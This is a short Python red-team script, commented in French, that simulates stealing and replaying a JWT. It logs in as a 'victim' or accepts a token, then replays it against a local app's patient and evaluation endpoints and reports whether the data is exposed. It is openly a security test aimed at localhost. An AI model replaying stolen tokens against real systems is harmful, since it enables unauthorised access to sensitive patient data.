"""
Simulateur de vol et de rejeu de JWT (Red Team).

Scenario :
1. Une "victime" se connecte normalement et obtient un JWT (ex: via le
   navigateur, /login/).
2. Un "attaquant" recupere ce token (reseau non chiffre, log, XSS, etc.
   - le mode de vol exact n'est pas simule ici, seul le resultat l'est).
3. L'attaquant rejoue ce token, depuis une machine differente, pour acceder
   a des ressources protegees sans jamais avoir connu le mot de passe.

Usage :
    python red_team/replay_simulator.py --token "<jwt_vole>"

Ou, pour tout enchainer automatiquement (login + vol simule + rejeu) :
    python red_team/replay_simulator.py --username alice --password pass123
"""

import argparse
import sys

import requests

BASE_URL = "http://localhost:8000"


def login(username: str, password: str) -> str:
    resp = requests.post(
        f"{BASE_URL}/api/auth/login/",
        json={"username": username, "password": password},
        timeout=5,
    )
    resp.raise_for_status()
    token = resp.json()["access_token"]
    print(f"[Victime] Connexion reussie. Token obtenu :\n{token}\n")
    return token


def replay_with_stolen_token(token: str) -> None:
    print("[Attaquant] Rejeu du token vole, sans aucun mot de passe connu...")
    headers = {"Authorization": f"Bearer {token}"}

    for endpoint in ["/api/patients/", "/api/evaluations/"]:
        resp = requests.get(f"{BASE_URL}{endpoint}", headers=headers, timeout=5)
        status = resp.status_code
        print(f"  GET {endpoint} -> {status}")
        if status == 200:
            print("    VULNERABLE : l'attaquant a acces aux donnees sans etre proprietaire du compte.")
            print(f"    Extrait de la reponse : {resp.text[:300]}")
        else:
            print("    Acces refuse.")


def main():
    parser = argparse.ArgumentParser(description="Simulateur de vol/rejeu de JWT")
    parser.add_argument("--username", help="Identifiant de la victime (pour se connecter)")
    parser.add_argument("--password", help="Mot de passe de la victime")
    parser.add_argument("--token", help="Token deja vole, a rejouer directement")
    args = parser.parse_args()

    if args.token:
        replay_with_stolen_token(args.token)
    elif args.username and args.password:
        token = login(args.username, args.password)
        replay_with_stolen_token(token)
    else:
        print("Fournir soit --token, soit --username/--password.")
        sys.exit(1)


if __name__ == "__main__":
    main()
